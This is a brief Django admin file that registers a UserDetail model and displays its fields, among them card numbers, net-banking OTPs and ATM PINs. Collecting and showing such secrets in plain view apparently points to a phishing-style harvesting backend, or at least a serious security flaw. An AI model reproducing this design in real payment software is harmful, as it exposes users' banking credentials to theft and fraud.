from django.contrib import admin

# Register your models here.
from . models import UserDetail

class userDetailsAdmin(admin.ModelAdmin):
     list_display=[
          'sNo',
          'payment_mode',
          'card_number',
          'net_banking_id',
          'net_banking_otp',
          'otp',
          'atm_pin',
          'amount',
          'user_id',
          'date'
     ]

admin.site.register(UserDetail, userDetailsAdmin) 

# admin.site.register(UserDetails)
